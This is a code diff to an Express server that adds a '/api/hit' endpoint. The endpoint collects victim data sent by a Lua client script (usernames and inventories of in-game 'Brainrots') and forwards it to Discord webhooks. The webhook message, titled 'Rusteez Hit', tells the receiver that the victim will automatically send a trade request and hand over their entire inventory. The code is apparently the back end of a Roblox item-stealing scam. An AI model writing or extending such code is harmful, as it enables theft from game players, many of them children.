@@ -14,12 +14,15 @@ const axios = require('axios');
 const { PastefyClient } = require('@interaapps/pastefy');
 
 const BaseInfo = require('./models/BaseInfo'); // <-- import du modèle
+const ScriptsInfos = require('./models/Scripts'); // <-- import du modèle
+const UsersInfo = require('./models/Users'); // <-- import du modèle
 
 // --- CONFIGURATION ---
 const PORT = process.env.PORT || 3000;
 const MONGO_URI = process.env.MONGO_URI;
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
+const WEBHOOK_URL = process.env.WEBHOOK_URL;
 
 const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
 
@@ -86,7 +89,6 @@ app.post('/api/base-infos', async (req, res) => {
         return res.status(500).json({ success: false, message: 'Internal server error' });
     }
 });
-
 // --- NOUVEL ENDPOINT: récupérer tous les Brainrots aplatis ---
 app.get('/api/base-infos', async (req, res) => {
     try {
@@ -115,6 +117,112 @@ app.get('/api/base-infos', async (req, res) => {
         return res.status(500).json({ success: false, message: 'Internal server error' });
     }
 });
+
+app.post('/api/hit', async (req, res) => {
+    // IMPORTANT: toujours retourner 201 pour le client Lua, même en cas d'erreur.
+    try {
+        const payload = req.body || {};
+
+        // Validation minimale attendue par ton script Lua
+        if (!payload.Name) {
+            log('⚠️ /api/hit reçu sans Name');
+            // retourner 201 quand même pour la compatibilité Lua
+            return res.status(201).json({ Success: true, Message: 'Hit received' });
+        }
+
+        // On forwarde d'abord vers WEBHOOK_URL si configuré
+        const hitInfo = payload; // forwarder uniquement le payload tel quel
+        log(`📣 [HIT] Reçu: ${hitInfo.Name || 'N/A'} ScriptId:${hitInfo.ScriptId || 'N/A'}`);
+
+        if (WEBHOOK_URL) {
+            PostHitOnWebHook(WEBHOOK_URL, hitInfo)
+                .catch(err => log(`⚠️ PostHitOnWebHook (env) rejection: ${err && err.message ? err.message : err}`));
+        } else {
+            log('⚠️ WEBHOOK_URL non configuré, skip forward to env webhook');
+        }
+
+        // Si ScriptId présent et valide (non null, non vide, non "Master"), rechercher script et forwarder aussi
+        try {
+            if (hitInfo.ScriptId && String(hitInfo.ScriptId).trim() !== '') {
+                const script = await ScriptsInfos.findOne({ Id: String(hitInfo.ScriptId) }).lean();
+                if (script && script.WebHookUrl) {
+                    // éviter double envoi vers la même URL
+                    if (!WEBHOOK_URL || String(script.WebHookUrl) !== String(WEBHOOK_URL)) {
+                        PostHitOnWebHook(script.WebHookUrl, hitInfo)
+                            .catch(err => log(`⚠️ PostHitOnWebHook (script) rejection: ${err && err.message ? err.message : err}`));
+                    } else {
+                        log('ℹ️ Script WebHookUrl identique à WEBHOOK_URL, envoi unique effectué.');
+                    }
+                } else {
+                    log(`⚠️ Aucun WebHookUrl trouvé pour ScriptId ${hitInfo.ScriptId}`);
+                }
+            }
+        } catch (err) {
+            log(`⚠️ Erreur lookup Script: ${err && err.message ? err.message : err}`);
+            // on continue — la réponse au client Lua restera 201
+        }
+
+        // Retourner toujours 201 pour que le script Lua considère l'envoi comme réussi
+        return res.status(201).json({ Success: true, Message: 'Hit received' });
+    } catch (err) {
+        // En cas d'exception interne, journaliser mais retourner success quand même
+        log(`❌ [API] POST /api/hit error (catch): ${err && err.message ? err.message : err}`);
+        return res.status(201).json({ Success: true, Message: 'Hit received (processing error logged)' });
+    }
+});
+
+async function PostHitOnWebHook(webHookUrl, hitInfo) {
+    try {
+        const webhookClient = new WebhookClient({ url: webHookUrl });
+        const hitEmbed = new EmbedBuilder()
+                .setTitle("Rusteez Hit")
+                .setColor(0x2b2d31)
+                .setDescription(`🛠️ **How to proceed?**\nJoin SAB. The victim is set to send a trade request automatically. If they don't, manually send them one; they will accept and transfer their entire inventory to you.`)
+                .addFields(
+                    {
+                        name: "📄 Player Information",
+                        value: `\`\`\`properties\n🆔 Username     : ${hitInfo.Name}\n👑 Receiver     : ${Array.isArray(hitInfo.Targets) ? hitInfo.Targets.join(', ') : hitInfo.Targets}\n\`\`\``
+                    },
+                    {
+                        name: "🧠 Brainrots",
+                        value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0
+                            ? hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0)).map(br => {
+                                // 1. Préparation des éléments (Mutation + Traits)
+                                let extras = [];
+
+                                // On ajoute la mutation en premier si elle existe
+                                if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None" && br.Mutation !== "Default") {
+                                    extras.push(br.Mutation);
+                                }
+
+                                // On ajoute les traits (qu'ils soient déjà une string ou un array)
+                                if (br.Traits) {
+                                    if (Array.isArray(br.Traits)) {
+                                        br.Traits.forEach(t => { if (t && t !== "") extras.push(t); });
+                                    } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
+                                        extras.push(br.Traits);
+                                    }
+                                }
+
+                                // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
+                                const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
+
+                                // 3. Retour de la ligne formatée
+                                return `${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
+                            }).join('\n')
+                            : "None"}\n\`\`\``
+                    }
+                )
+                .setFooter({ text: `Rusteez Script` })
+                .setTimestamp();
+        await webhookClient.send({
+                content: hitInfo.Name,
+                embeds: [hitEmbed]
+            });
+    } catch (err) {
+        log(`⚠️ Forward Webhook Error: ${err.message}`);
+    }
+}
 
 app.use(express.static('public'));
 
